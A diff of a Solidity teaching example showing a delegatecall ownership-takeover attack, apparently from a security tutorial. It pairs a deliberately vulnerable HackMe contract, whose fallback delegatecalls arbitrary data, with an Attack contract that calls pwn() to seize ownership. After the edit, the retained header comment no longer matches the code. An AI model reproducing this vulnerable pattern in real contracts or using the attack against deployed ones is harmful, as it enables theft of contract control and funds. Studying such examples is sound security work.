@@ -1,5 +1,5 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.17;
+// SPDX-License-Identifier:MIT
+pragma solidity ^0.8.19;
 
 /*
 This is a more sophisticated version of the previous exploit.
@@ -21,53 +21,35 @@ change the owner.
 */
 
 contract Lib {
-    uint public someNumber;
+    address public owner;
 
-    function doSomething(uint _num) public {
-        someNumber = _num;
+    function pwn() public {
+        owner = msg.sender;
     }
 }
 
 contract HackMe {
-    address public lib;
     address public owner;
-    uint public someNumber;
+    Lib public lib;
 
-    constructor(address _lib) {
-        lib = _lib;
+    constructor(Lib _lib) {
         owner = msg.sender;
+        lib = Lib(_lib);
     }
 
-    // 自己合約執行這一個lib address 會被替換掉。
-    function doSomething(uint _num) public {
-        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
+    fallback() external payable {
+        address(lib).delegatecall(msg.data);
     }
 }
 
 contract Attack {
-    // Make sure the storage layout is the same as HackMe
-    // This will allow us to correctly update the state variables
-    address public lib;
-    address public owner;
-    uint public someNumber;
+    address public hackMe;
 
-    HackMe public hackMe;
-
-    constructor(HackMe _hackMe) {
-        hackMe = HackMe(_hackMe);
+    constructor(address _hackMe) {
+        hackMe = _hackMe;
     }
 
-    // 被攻擊合約地址會被替換成攻擊合約的擁有者。
     function attack() public {
-        // override address of lib，轉換合約地址格式。
-        hackMe.doSomething(uint(uint160(address(this))));
-        // pass any number as input, the function doSomething() below will
-        // be called
-        hackMe.doSomething(1);
-    }
-
-    // function signature must match HackMe.doSomething()
-    function doSomething(uint _num) public {
-        owner = msg.sender;
+        hackMe.call(abi.encodeWithSignature("pwn()"));
     }
 }
